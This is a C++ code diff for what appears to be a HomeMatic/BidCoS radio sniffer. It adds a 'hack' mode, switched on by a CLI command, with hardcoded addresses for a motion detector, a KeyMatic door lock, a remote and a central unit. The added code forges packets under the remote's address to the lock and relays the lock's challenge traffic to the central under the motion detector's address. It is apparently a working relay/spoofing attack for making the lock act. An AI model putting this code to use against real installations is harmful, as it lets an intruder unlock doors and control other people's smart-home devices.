@@ -354,6 +354,51 @@ bool HM_SD::packetReceived(std::shared_ptr<BidCoSPacket> packet)
 			}
 		}
 		if(_filters.size() == 0) printPacket = true;
+		if(_hack)
+		{
+			int32_t addressMotionDetector = 0x1A4EFE;
+			int32_t addressKeyMatic = 0x1F454D;
+			int32_t addressRemote = 0x24C0EE;
+			int32_t addressCentral = 0x1C6940;
+
+			if(packet->senderAddress() == addressMotionDetector)
+			{
+				if(packet->messageType() == 0x10)
+				{
+					_messageCounter[1]++;
+					std::vector<uint8_t> payload;
+					payload.push_back(0x03);
+					payload.push_back(_messageCounter[1]);
+					std::shared_ptr<BidCoSPacket> packet1(new BidCoSPacket(packet->messageCounter(), 0xA4, 0x40, addressRemote, addressKeyMatic, payload));
+					packet1->setTimeSending(HelperFunctions::getTime());
+					GD::physicalDevice->sendPacket(packet1);
+				}
+				else if(packet->messageType() == 0x03 && packet->controlByte() == 0xA0)
+				{
+					std::vector<uint8_t> payload = *packet->payload();
+					std::shared_ptr<BidCoSPacket> packet3(new BidCoSPacket(packet->messageCounter(), 0xA0, 0x03, addressRemote, addressKeyMatic, payload));
+					packet3->setTimeSending(HelperFunctions::getTime());
+					GD::physicalDevice->sendPacket(packet3);
+				}
+			}
+			else if(packet->senderAddress() == addressKeyMatic)
+			{
+				if(packet->messageType() == 0x02 && packet->controlByte() == 0xA0)
+				{
+					std::vector<uint8_t> payload = *packet->payload();
+					std::shared_ptr<BidCoSPacket> packet2(new BidCoSPacket(packet->messageCounter(), 0xA0, 0x02, addressCentral, addressMotionDetector, payload));
+					packet2->setTimeSending(HelperFunctions::getTime());
+					GD::physicalDevice->sendPacket(packet2);
+				}
+				else if(packet->messageType() == 0x02 && packet->controlByte() == 0x80 && packet->payload()->size() == 5)
+				{
+					std::vector<uint8_t> payload = *packet->payload();
+					std::shared_ptr<BidCoSPacket> packet4(new BidCoSPacket(packet->messageCounter(), 0x80, 0x02, addressCentral, addressMotionDetector, payload));
+					packet4->setTimeSending(HelperFunctions::getTime());
+					GD::physicalDevice->sendPacket(packet4);
+				}
+			}
+		}
 		if(printPacket) std::cout << HelperFunctions::getTimeString(packet->timeReceived()) << " Received: " + packet->hexString() << std::endl;
 		for(std::list<HM_SD_OverwriteResponse>::const_iterator i = _responsesToOverwrite.begin(); i != _responsesToOverwrite.end(); ++i)
 		{
@@ -843,6 +888,19 @@ std::string HM_SD::handleCLICommand(std::string command)
 			sendPacket(packet);
 			stringStream << "Packet sent: " << packet->hexString() << std::endl;
 			return stringStream.str();
+		}
+		else if(command.compare(0, 4, "hack") == 0)
+		{
+			if(_hack)
+			{
+				_hack = false;
+				return "Hack disabled.\n";
+			}
+			else
+			{
+				_hack = true;
+				return "Hack enabled.\n";
+			}
 		}
 		else return "Unknown command.\n";
 	}
